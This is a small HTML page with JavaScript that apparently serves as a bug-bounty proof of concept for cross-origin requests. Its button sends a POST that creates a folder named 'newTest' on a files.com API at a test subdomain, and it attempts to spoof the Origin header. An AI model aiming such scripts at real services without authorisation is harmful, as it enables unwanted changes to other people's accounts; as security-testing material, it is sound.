<html>

<body>
    <select id="exchange"><option value="binance">Binance</option></select>
    <button onclick="runAPI();">Run</button>
</body>
<script>
    function runAPI() {
        var exchange = document.getElementById("exchange").value;
        if (exchange == "binance") {
            request('POST', 'https://bugbountytrialcompany312.files.com/api/rest/v1/folders/newTest').
            then((d1) => {
                console.log(d1.target.responseText);
            }).
            catch((err) => {
                console.log(err);
            });
        }
    }

    function request(method, url) {
        return new Promise(function(resolve, reject) {
            var xhr = new XMLHttpRequest();
            xhr.open(method, url);
            xhr.setRequestHeader('origin', 'http://dhinakaran.in');


            xhr.onload = resolve;
            xhr.onerror = reject;
            xhr.send();
        });
    }
</script>

</html>
